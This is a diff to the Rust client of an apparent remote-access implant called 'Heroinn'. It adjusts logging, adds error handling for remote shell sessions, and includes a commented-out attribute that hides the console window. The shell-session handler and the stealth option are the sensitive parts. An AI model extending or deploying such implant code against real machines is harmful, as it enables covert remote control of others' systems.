@@ -1,3 +1,4 @@
+//#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
 use std::{sync::{mpsc::channel, Arc, atomic::AtomicU64, Mutex}, time::Duration, str::FromStr};
 use std::sync::atomic::Ordering::Relaxed;
 use uuid::Uuid;
@@ -17,12 +18,21 @@ const G_CONNECTION_INFO : SlaveDNA = SlaveDNA{ flag : CONNECTION_INFO_FLAG, size
 lazy_static!{
     static ref G_OUT_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
     static ref G_IN_BYTES : Arc<AtomicU64> = Arc::new(AtomicU64::new(0));
+    // if not write the line , G_CONNECTION_INFO will compile inline to origin code.
+    static ref G_DNA : SlaveDNA = G_CONNECTION_INFO;
 }
 
 fn main() {
 
-    simple_logger::SimpleLogger::new().with_threads(true).with_utc_timestamps().with_colors(true).init().unwrap();
-	::log::set_max_level(log::LevelFilter::Debug);
+    #[cfg(debug_assertions)]
+    {
+        simplelog::CombinedLogger::init(
+            vec![
+                simplelog::TermLogger::new(log::LevelFilter::Warn, simplelog::Config::default(), simplelog::TerminalMode::Mixed, simplelog::ColorChoice::Auto),
+                simplelog::WriteLogger::new(log::LevelFilter::Info, simplelog::Config::default(), std::fs::File::create("my_rust_binary.log").unwrap()),
+            ]
+        ).unwrap();
+    }
 
     let clientid = Uuid::new_v4().to_string();
 
@@ -224,7 +234,13 @@ fn main() {
 
                     match HeroinnServerCommandID::from(buf[0]){
                         HeroinnServerCommandID::Shell => {
-                            let msg = Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf).unwrap();
+                            let msg = match Message::new(client.local_addr().unwrap() , HeroinnProtocol::TCP , &buf){
+                                Ok(p) => p,
+                                Err(e) => {
+                                    log::error!("create shell session faild : {}" ,e);
+                                    continue;
+                                },
+                            };
                             let session = ShellClient::new_client(session_sender.clone(), &clientid , &msg.parser_sessionpacket().unwrap().id).unwrap();
                             shell_session_mgr.lock().unwrap().register(session);
                         },
